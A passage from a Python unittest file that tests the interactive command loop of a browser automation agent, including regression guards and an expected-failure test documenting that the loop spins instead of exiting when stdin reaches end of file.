        # CURRENT BEHAVIOUR (regression guard).
        out = self.drive(['frobnicate', 'exit'])
        self.assertIn('Unknown command: frobnicate', out)
        self.assertIn('Goodbye', out)

    def test_a_keyboard_interrupt_does_not_end_the_session(self):
        # CURRENT BEHAVIOUR (regression guard).
        out = self.drive([KeyboardInterrupt(), 'exit'])
        self.assertIn('Interrupted', out)
        self.assertIn('Goodbye', out)

    # DEFECT D15: asserts CORRECT behaviour; delete the decorator
    # below (or run with -k) to see it fail against the current source.
    @unittest.expectedFailure
    def test_the_loop_exits_when_stdin_reaches_end_of_file(self):
        """A piped or closed stdin raises EOFError from input(). The loop's
        bare 'except Exception' catches it, prints "Error: " and immediately
        asks for input again, so the process spins on a dead stdin instead of
        exiting."""
        calls = []

        def feed(prompt=''):
            calls.append(prompt)
            if len(calls) > 3:
                raise LoopGuard
            raise EOFError

        buf = io.StringIO()
        agent = browser_agent.BrowserAutomationAgent()
        try:
            with mock.patch.object(browser_agent, 'input', feed, create=True):
                with redirect_stdout(buf):
                    browser_agent.interactive_mode(agent)
        except LoopGuard:
            self.fail('interactive_mode kept prompting after EOF on stdin '
                      '(%d prompts); a closed stdin must end the session'
                      % len(calls))
        self.assertEqual(self.requests, [])


if __name__ == '__main__':
    unittest.main()
